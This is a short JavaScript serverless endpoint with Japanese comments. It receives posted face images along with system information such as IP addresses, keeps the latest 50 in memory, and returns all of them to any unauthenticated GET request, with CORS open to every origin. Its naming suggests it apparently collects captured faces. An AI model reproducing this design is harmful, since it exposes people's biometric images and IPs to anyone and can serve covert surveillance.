// api/capture.js
let capturedFaces = global.capturedFaces || [];
global.capturedFaces = capturedFaces;

export default function handler(req, res) {
    // CORS headers
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
    res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');

    if (req.method === 'OPTIONS') {
        res.status(200).end();
        return;
    }

    if (req.method === 'POST') {
        try {
            const { images, system_info, timestamp } = req.body;
            
            // 新しいキャプチャデータを追加
            const captureData = {
                id: Date.now(),
                timestamp: timestamp || new Date().toISOString(),
                images: images || [],
                system_info: system_info || {},
                capture_count: images ? images.length : 0
            };
            
            capturedFaces.push(captureData);
            global.capturedFaces = capturedFaces;
            
            // 最新の50件のみ保持
            if (capturedFaces.length > 50) {
                capturedFaces = capturedFaces.slice(-50);
                global.capturedFaces = capturedFaces;
            }
            
            console.log(`新しい顔画像を受信: ${captureData.capture_count}枚, IP: ${system_info?.ip_address || 'Unknown'}`);
            
            res.status(200).json({
                success: true,
                message: '画像を正常に受信しました',
                id: captureData.id
            });
        } catch (error) {
            console.error('画像受信エラー:', error);
            res.status(500).json({
                success: false,
                error: '画像の保存に失敗しました'
            });
        }
    } else if (req.method === 'GET') {
        // データを取得
        res.status(200).json(capturedFaces);
    } else {
        res.status(405).json({ error: 'Method not allowed' });
    }
}
